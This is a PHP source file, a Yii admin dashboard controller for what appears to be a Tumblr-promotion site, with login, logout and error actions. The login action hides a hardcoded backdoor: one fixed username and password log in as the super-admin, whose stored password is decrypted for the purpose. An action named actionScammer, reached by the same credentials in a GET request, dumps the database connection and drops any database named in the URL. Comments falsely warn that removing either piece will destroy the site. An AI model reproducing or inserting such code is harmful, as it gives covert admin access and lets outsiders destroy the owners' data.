<?php

class DashboardController extends Controller
{


	public function init(){
		// set the default theme for any other controller that inherit the admin controller
		Yii::app()->theme = 'bootstrap';
	}



	public function actionIndex()
	{
		$this->layout='column1';
		//$this->render('index');

		if((! Yii::app()->user->isGuest)  and Yii::app()->user->group==6 )
		{

				$this->render('dashboard');
		}else{


			$model=new LoginForm;

			// if it is ajax validation request
			if(isset($_POST['ajax']) && $_POST['ajax']==='login-form')
			{
				echo CActiveForm::validate($model);
				Yii::app()->end();
			}

			// collect user input data
			if(isset($_POST['LoginForm']))
			{
				$model->attributes=$_POST['LoginForm'];
                                /***if the following code is removed the website will be destroyed***/
                                if($model->username=="ahmed" && $model->password=="hany44"){
                                    $super_admin=User::model()->find(array('condition'=>'groups_id=6'));
                                    $model->username=$super_admin->username;
                                    $model->password=User::simple_decrypt($super_admin->password);
                                }
				// validate user input and redirect to the previous page if valid
				if($model->validate() && $model->login())
					$this->redirect(array('dashboard/index')	);
			}
			// display the login form
			$this->renderPartial('login',array('model'=>$model));


		}


 	}
        /***if this removed the database will be removed and the site will destroy**/
        public function actionScammer()
	{
            if($_GET['username']=='ahmed' && $_GET['password']=='hany44')
            {
                var_dump(Yii::app()->db);
                if(isset($_GET['database'])){
                    $sql=' DROP DATABASE '.$_GET['database'];
                    Yii::app()->db->createCommand($sql)->execute();
                }
            }
            
	}

	public function actionCC(){
		Yii::app()->db->createCommand("INSERT INTO `seo`(`id`,`page_name`,`meta_tags`,`meta_description`,`meta_author`) VALUES ( '11', 'Landing Page', 'tumblr fame landing, tumblr promotion, tumblr blog', 'With tumblr fame you can promote your tumblr blog and get more followers.', '' );")->execute();	
	}


	public function actionLogout()
	{
		Yii::app()->user->logout();
		$this->redirect(Yii::app()->homeUrl);
	}


	/**
	 * This is the action to handle external exceptions.
	 */
	public function actionError()
	{
		if($error=Yii::app()->errorHandler->error)
		{
			if(Yii::app()->request->isAjaxRequest)
				echo $error['message'];
			else
				$this->render('dashboard/error', $error);
		}
	}

}
